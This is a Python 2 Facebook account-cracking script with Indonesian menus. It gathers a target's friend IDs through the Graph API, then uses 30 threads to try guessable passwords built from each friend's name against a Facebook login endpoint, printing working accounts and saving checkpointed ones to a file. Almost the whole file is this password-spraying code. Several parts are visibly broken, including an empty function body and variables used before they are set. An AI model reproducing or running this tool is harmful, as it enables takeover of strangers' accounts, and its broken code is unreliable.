#!/usr/bin/python2
#coding=utf-8
#DEVIL-HACK THE OFFICAL ROGRAMMER 
#FBCLONING COMMMAD MAKER 
#FB : RAMDANI ID


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "Keluar"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


#Dev:DEVIL-HACK
#### LOGO ####
logo = """
⊱⋕⊰═════════════════════════════════════════⊱⋕⊰
  ╭━━━━┳━━━┳━╮╱╭┳━━━━┳━━━╮
  ┃╭╮╭╮┃╭━╮┃┃╰╮┃┃╭╮╭╮┃╭━━╯
  ╰╯┃┃╰┫┃╱┃┃╭╮╰╯┣╯┃┃╰┫╰━━╮
  ╱╱┃┃╱┃╰━╯┃┃╰╮┃┃╱┃┃╱┃╭━━╯
  ╱╱┃┃╱┃╭━╮┃┃╱┃┃┃╱┃┃╱┃╰━━╮
  ╱╱╰╯╱╰╯╱╰┻╯╱╰━╯╱╰╯╱╰━━━╯
[÷] JANGAN LUPA ADD FB GUA BANGSAD [÷]
[÷] FB : https://m.facebook.com/DEVILS69JAVHD [÷]
⊱⋕⊰═════════════════════════════════════════⊱⋕⊰
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("Mohon tunggu "+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "Not Vuln"
vuln = "Vuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "Not Vuln"
vuln = "Vuln"

os.system("clear")
print  """

       ╔═══╦═══╦╗──╔╦══╦╗
       ╚╗╔╗║╔══╣╚╗╔╝╠╣╠╣║
       ─║║║║╚══╬╗║║╔╝║║║║
       ─║║║║╔══╝║╚╝║─║║║║─╔╗
       ╔╝╚╝║╚══╗╚╗╔╝╔╣╠╣╚═╝║
       ╚═══╩═══╝─╚╝─╚══╩═══╝                       

"""

jalan("•◈•───────•◈ SELAMAT MALING •◈•───────•◈•")  

jalan("   [÷]──╔╦═══╦═╗─╔╦═══╦═══╦═══╗[÷]")
jalan("   [÷]──║║╔═╗║║╚╗║╠╗╔╗║╔══╣╔═╗║[÷]")
jalan("   [÷]──║║║─║║╔╗╚╝║║║║║╚══╣╚══╗[÷]")
jalan("   [÷]╔╗║║╚═╝║║╚╗║║║║║║╔══╩══╗║[÷]")
jalan("   [÷]║╚╝║╔═╗║║─║║╠╝╚╝║╚══╣╚═╝║[÷]")
jalan("   [÷]╚══╩╝─╚╩╝─╚═╩═══╩═══╩═══╝[÷]")
jalan("   [÷] SELAMAT DATANG DI NERAKA  ")
jalan("   [÷] JANGAN LUPA COLI DULU BIAR HOKI ")

jalan("•◈•──────────•◈• DEVIL-HACK •◈•──────────•◈•")

CorrectUsername = "javhd"
CorrectPassword = "1878"

loop = 'true'
while (loop == 'true'):
    username = raw_input("[#] Enter Username ➤ ")
    if (username == CorrectUsername):
    	password = raw_input("[#] Enter Password ➤ ")
        if (password == CorrectPassword):
            print "Berhasil masuk sebagai " + username  #DEV Devil-Hack
            loop = 'Salah'
        else:
            print "Kata sandi salah!"
            os.system('xdg-open https://m.facebook.com/DEVILS69JAVHD')
    else:
        print "Nama pengguna salah!"
        os.system('xdg-open https://m.facebook.com/DEVILS69JAVHD')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	def tokenz():
	print logo
	toket = raw_input("[+] Token : Masukan Toket Gedemu Disini >> ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "[!] Salah"
		e = raw_input("[?] Toket Yang Anda Masukan Terlalu Kecil? [y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"Token tidak valid"
		os.system('rm -rf login.txt')
		time.sleep()
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"Akun Lu Terkena Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep()
		login()
	except requests.exceptions.ConnectionError:
		print"Tidak Ada Jaringan Bodoh"
		keluar()
	os.system("clear")
	print logo
	jalan( "⊱⋕⊰═════════════════════════════════════════⊱⋕⊰"  ) 
	print "  [÷] Name : "+nama+"  	   "                               
	print "  [÷] ID  : "+id+"        "
	jalan( "⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 
	print "[1] >> Mulai Maling "																														
	print "[0] >> Keluar "
	pilih()

def pilih():
	unikers = raw_input(">>> ")
	if unikers =="":
		print "Isi dengan benar"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
		os.system('git pull origin master')
		raw_input('Keluar ')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "Isi dengan benar"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token tidak valid"
		os.system('rm -rf login.txt')
		time.sleep()
		login()
	os.system('clear')
	print logo
	print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	jalan( "[1] >> Crack Publik") 
	jalan( "[0] >> Kembali") 
	print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	pilih_super()

def pilih_super():
	peak = raw_input(">>> ")
	if peak =="":
		print "Isi dengan benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
		idt = raw_input("[⊱÷⊰] Masukan ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[⊱⋕⊰] Nama : "+op["name"]
		except KeyError:
			print"[⊱⋕⊰] ID Tidak Ditemukan!"
			raw_input("Kembali")
			super()
		print"[⊱⋕⊰] Mengambil ID Target........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "Isi dengan benar"
		pilih_super()

	
	print "[⊱⋕⊰] Jumlah Target : "+str(len(id))
	jalan('[⊱⋕⊰] Tunggu Bodoh ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r[⊱⋕⊰] Sedang Maling"+o),;sys.stdout.flush();time.sleep(1)
	print "\n  ❈   Berhenti Maling Tekan CTRL+Z   ❈"
	print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '12'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '[OK]  ' + user  + ' | ' + pass1 + ' | ' + b['name']
				oks.append(user+pass1)
			else:
				if 'mbasic.facebook.com' in q["error_msg"]:
					print '[CP]  ' + user  + ' | ' + pass1 + ' | ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '[OK]  ' + user  + ' | ' + pass2 + ' | ' + b['name']
						oks.append(user+pass2)
					else:
						if 'mbasic.facebook.com' in q["error_msg"]:
							print '[CP]  ' + user  + ' | ' + pass2 + ' | ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '[OK]  ' + user  + ' | ' + pass3 + ' | ' + b['name']
								oks.append(user+pass3)
							else:
								if 'mbasic.facebook.com' in q["error_msg"]:
									print '[CP]  ' + user  + ' | ' + pass3 + ' | ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '[OK]  ' + user  + ' | ' + pass4 + ' | ' + b['name']
										oks.append(user+pass4)
									else:
										if 'mbasic.facebook.com' in q["error_msg"]:
											print '[CP]  ' + user  + ' | ' + pass4 + ' | ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '[OK]  ' + user  + ' | ' + pass5 + ' | ' + b['name']
												oks.append(user+pass5)
											else:
												if 'mbasic.facebook.com' in q["error_msg"]:
													print '[CP]  ' + user  + ' | ' + pass5 + ' | ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '[OK]  ' + user  + ' | ' + pass6 + ' | ' + b['name']
														oks.append(user+pass6)
													else:
														if 'mbasic.facebook.com' in q["error_msg"]:
															print 'CP] ' + user  + ' | ' + pass6 + ' | ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'bangladesh'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '[OK]  ' + user  + ' | ' + pass7 + ' | ' + b['name']
																oks.append(user+pass7)
															else:
																if 'mbasic.facebook.com' in q["error_msg"]:
																	print '[CP]  ' + user  + ' | ' + pass7 + ' | ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)	
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "⊱⋕⊰═════════════════════════════════⊱⋕⊰" 
	print '[÷] Process Maling Telah Selesai  ....'
	print"[÷] Total OK/CP : "+str(len(oks))+"/"+str(len(cekpoint))
	print("[÷] Hasil Maling Disimpan : save/checkpoint.txt")
	raw_input("Kembali")
	menu()

if __name__ == '__main__':
	login()
